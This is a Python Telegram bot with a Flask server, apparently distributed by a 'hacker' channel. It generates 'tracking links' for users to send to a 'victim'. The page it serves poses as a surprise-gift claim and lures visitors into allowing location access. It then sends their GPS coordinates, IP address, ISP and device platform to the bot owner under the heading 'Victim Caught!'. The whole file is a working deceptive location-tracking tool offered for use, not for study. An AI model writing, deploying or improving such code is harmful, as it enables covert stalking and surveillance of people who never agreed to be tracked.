import os
import telebot
from flask import Flask, request, render_template_string
from threading import Thread

# --- SETTINGS ---
TOKEN = os.environ.get('BOT_TOKEN')
OWNER_ID = 7162565886 
CH_USERNAME = "@HackersColony" # आपका टेलीग्राम चैनल
YT_LINK = "https://youtube.com/@hackers_colony_tech?si=GyqlRdhRdvJ9Ugd8" # आपका यूट्यूब चैनल

bot = telebot.TeleBot(TOKEN)
app = Flask('')

# यूजर डेटा स्टोर करने के लिए (Broadcast के लिए)
users_file = "users.txt"

# --- आपका वही ओरिजिनल HTML कोड ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Claim Your Surprise Gift!</title>
    <style>
        body { background-color: #0f172a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; background: #1e293b; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 2px solid #3b82f6; width: 80%; max-width: 400px; }
        h1 { color: #facc15; font-size: 24px; margin-bottom: 10px; }
        p { color: #94a3b8; font-size: 16px; line-height: 1.5; }
        .gift-box { font-size: 80px; margin: 20px 0; animation: shake 0.5s infinite; }
        @keyframes shake { 0% { transform: rotate(0deg); } 25% { transform: rotate(5deg); } 50% { transform: rotate(0deg); } 75% { transform: rotate(-5deg); } 100% { transform: rotate(0deg); } }
        #status { font-weight: bold; margin-top: 20px; color: #3b82f6; }
        .btn { background: #3b82f6; color: white; padding: 12px 25px; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="gift-box">🎁</div>
        <h1>Congratulations!</h1>
        <p>You have won an exclusive surprise gift! 🎊</p>
        <p>To verify your account and claim the reward, please allow <b>Location Access</b> when prompted.</p>
        <div id="status">🔄 Verifying Region...</div>
        <button class="btn" onclick="catchData()">CLAIM NOW</button>
    </div>

    <script>
        async function catchData() {
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        await fetch('/send-data', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                ip: ipData.ip,
                                org: ipData.org,
                                platform: navigator.platform
                            })
                        });
                        document.getElementById('status').innerHTML = "<b style='color:#ef4444;'>❌ Error: Reward Expired!</b>";
                    });
                }
            } catch (e) { console.log("Error"); }
        }
    </script>
</body>
</html>
"""

# --- BOT FUNCTIONS ---

def is_joined(user_id):
    try:
        member = bot.get_chat_member(CH_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return True

def add_user(user_id):
    if not os.path.exists(users_file): open(users_file, 'a').close()
    with open(users_file, "r+") as f:
        if str(user_id) not in f.read():
            f.write(str(user_id) + "\n")

@bot.message_handler(commands=['start'])
def start(message):
    add_user(message.from_user.id)
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("1. Join Telegram", url=f"https://t.me/{CH_USERNAME[1:]}"))
    markup.add(telebot.types.InlineKeyboardButton("2. Subscribe YouTube", url=YT_LINK))
    markup.add(telebot.types.InlineKeyboardButton("✅ Joined / Verify", callback_data="verify"))
    
    bot.send_message(message.chat.id, "❌ **Access Denied!**\n\nरोशन, बॉट इस्तेमाल करने के लिए आपको नीचे दिए गए दोनों चैनल जॉइन करने होंगे।", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify(call):
    if is_joined(call.from_user.id):
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("📍 Track Location")
        bot.send_message(call.message.chat.id, "✅ Verification Successful!\nअब आप 'Track Location' बटन दबा सकते हैं।", reply_markup=markup)
    else:
        bot.answer_callback_query(call.id, "❌ आपने अभी तक चैनल जॉइन नहीं किया है!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "📍 Track Location")
def send_link(message):
    if not is_joined(message.from_user.id): return start(message)
    link = f"https://{request.host}/" 
    bot.send_message(message.chat.id, f"🔗 **आपका ट्रैकिंग लिंक:**\n\n`{link}`\n\nइसे विक्टिम को भेजें।", parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id != OWNER_ID: return
    txt = message.text.replace("/broadcast ", "")
    if os.path.exists(users_file):
        with open(users_file, "r") as f:
            for user in f.readlines():
                try: bot.send_message(user.strip(), f"📢 **Announcement:**\n\n{txt}", parse_mode="Markdown")
                except: pass
    bot.reply_to(message, "✅ ब्रॉडकास्ट पूरा हुआ!")

# --- FLASK ROUTES ---
@app.route('/')
def home(): return render_template_string(HTML_TEMPLATE)

@app.route('/send-data', methods=['POST'])
def receive():
    data = request.json
    map_url = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
    report = (f"🚀 *Victim Caught!* 🚀\n\n"
              f"🌐 *IP:* `{data['ip']}`\n"
              f"🏢 *ISP:* {data['org']}\n"
              f"📱 *Device:* {data['platform']}\n"
              f"📍 *Location:* [Open Maps]({map_url})\n\n"
              f"⚡ *Created by Roshan Ali* ⚡")
    bot.send_message(OWNER_ID, report, parse_mode="Markdown")
    return "OK", 200

if __name__ == "__main__":
    Thread(target=lambda: app.run(host='0.0.0.0', port=10000)).start()
    bot.infinity_polling()
    
